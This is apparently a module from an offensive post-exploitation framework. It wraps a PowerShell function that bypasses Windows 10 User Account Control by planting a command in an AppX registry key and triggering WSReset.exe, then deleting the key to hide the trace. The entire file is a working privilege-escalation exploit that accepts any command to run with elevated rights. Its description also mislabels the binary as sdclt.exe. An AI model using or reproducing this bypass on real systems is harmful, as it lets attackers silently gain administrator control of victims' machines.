from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Bypass UAC - Windows Store: invoke-wsreset",
                       "Description": "Bypass UAC Fileless. Binary: sdclt.exe on Windows 10",
                       "Author": "@josueencinar, @pablogonzalezpe",
                       "Reference": "https://www.activecyber.us/activelabs/windows-uac-bypass"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "instruction": [None, "Instruction bypass UAC", False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function invoke-wsreset{ 
                        Param (     
                            $instruction = "c:\windows\system32\windowspowershell\\v1.0\powershell.exe -C echo pwned > c:\iBombShell.txt" 
                        )

                        $path = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
                        $key = "DelegateExecute" 
                        
                        # Creating path
                        if(-not(Test-Path -Path $path))
                        {
                            New-Item $path -Force
                        
                        }

                        # Registry values
                        New-ItemProperty -Path $path -Name $key -Value "" -Force
                        Set-ItemProperty -Path $path -Name "(default)" -Value $instruction -Force
                        
                         WSReset.exe

                        Sleep 2
                        # Removing
                        rm -Force -Recurse $path
                    }
"""

        if self.args["instruction"]:
            function += 'invoke-wsreset -instruction "{}"'.format(self.args["instruction"])
        else:
            function += 'invoke-wsreset'
        super(CustomModule, self).run(function)